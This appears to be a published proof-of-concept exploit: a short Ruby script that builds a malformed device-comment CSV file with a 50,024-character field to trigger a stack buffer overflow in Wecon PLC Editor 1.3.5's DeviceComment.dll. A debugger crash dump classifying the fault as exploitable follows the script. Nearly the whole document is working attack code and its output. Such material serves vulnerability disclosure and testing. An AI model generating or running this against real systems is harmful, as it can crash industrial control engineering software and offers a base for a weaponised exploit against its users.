#!/usr/bin/env ruby
# Wecon PLC Editor V1.3.5 DeviceComment.dll Buffer Overflow.
# Access Violation when importing a specially crafted 
# device comment csv file.

csv = %Q|Device Name,Device Comment,Device Alias
FUZZ,User program runs into ON state,
END,,
|

buff = "A" * 50024

fd = File.new("poc.csv","wb")
fd.write(csv.gsub(/FUZZ/,buff))
fd.close
__END__
STATUS_STACK_BUFFER_OVERRUN encountered
(9f4.8e0): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=6e8195b0 ecx=7594c428 edx=001be119 esi=00000000 edi=00000000
eip=7594c2a5 esp=001be360 ebp=001be3dc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
kernel32!UnhandledExceptionFilter+0x5f:
7594c2a5 cc              int     3
0:000> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Stack Buffer Overrun (/GS Exception) starting at DeviceComment!itlab::DList<tagDevComment>::popFront+0x0000000000001ae9 (Hash=0x4566787f.0x6266787f)

An overrun of a protected stack buffer has been detected. This is considered exploitable, and must be fixed.

